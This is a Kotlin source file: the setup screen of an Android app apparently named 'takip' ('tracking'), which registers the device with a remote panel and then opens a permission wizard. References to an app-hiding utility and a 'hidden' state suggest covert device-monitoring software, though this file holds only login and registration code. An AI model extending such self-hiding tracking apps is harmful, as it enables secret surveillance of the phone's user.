package com.takip.app.ui

import android.content.Intent
import android.os.Bundle
import android.view.View
import androidx.appcompat.app.AppCompatActivity
import com.takip.app.BuildConfig
import com.takip.app.databinding.ActivitySetupBinding
import com.takip.app.util.AppHider
import com.takip.app.util.ConfigManager
import com.takip.app.util.DeviceUtils
import com.takip.app.util.PrefsManager
import com.takip.app.api.ApiClient
import androidx.lifecycle.lifecycleScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

class SetupActivity : AppCompatActivity() {

    private lateinit var binding: ActivitySetupBinding

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        if (PrefsManager.isSetupComplete && PrefsManager.isHidden) {
            finish()
            return
        }

        binding = ActivitySetupBinding.inflate(layoutInflater)
        setContentView(binding.root)

        val panelUrl = BuildConfig.DEFAULT_PANEL_URL
        val deviceName = DeviceUtils.getDisplayName()

        binding.deviceInfoText.text = deviceName
        binding.panelInfoText.text = panelUrl
        PrefsManager.panelUrl = panelUrl

        if (PrefsManager.isSetupComplete && !PrefsManager.isHidden) {
            startActivity(Intent(this, PermissionWizardActivity::class.java))
            finish()
            return
        }

        binding.connectButton.setOnClickListener { connectDevice(panelUrl, deviceName) }
    }

    private fun connectDevice(panelUrl: String, deviceName: String) {
        val email = binding.emailInput.text?.toString()?.trim() ?: ""
        val password = binding.passwordInput.text?.toString() ?: ""

        if (email.isEmpty() || password.isEmpty()) {
            showError("E-posta ve şifre girin")
            return
        }

        binding.connectButton.isEnabled = false
        binding.progressBar.visibility = View.VISIBLE
        binding.errorText.visibility = View.GONE

        lifecycleScope.launch {
            val discoverResult = withContext(Dispatchers.IO) {
                ConfigManager.discoverApiUrl(panelUrl)
            }

            if (discoverResult.isFailure) {
                binding.progressBar.visibility = View.GONE
                binding.connectButton.isEnabled = true
                showError(discoverResult.exceptionOrNull()?.message ?: "Sunucuya bağlanılamadı")
                return@launch
            }

            val result = withContext(Dispatchers.IO) {
                ApiClient.registerDevice(
                    email,
                    password,
                    deviceName,
                    DeviceUtils.getAndroidId(this@SetupActivity),
                    android.os.Build.MANUFACTURER,
                    android.os.Build.MODEL
                )
            }

            binding.progressBar.visibility = View.GONE
            binding.connectButton.isEnabled = true

            result.onSuccess { response ->
                PrefsManager.deviceToken = response.deviceToken
                PrefsManager.deviceId = response.deviceId
                PrefsManager.userEmail = email
                PrefsManager.isSetupComplete = true
                startActivity(Intent(this@SetupActivity, PermissionWizardActivity::class.java))
                finish()
            }.onFailure { e ->
                showError(e.message ?: "Bağlantı başarısız")
            }
        }
    }

    private fun showError(msg: String) {
        binding.errorText.text = msg
        binding.errorText.visibility = View.VISIBLE
    }
}
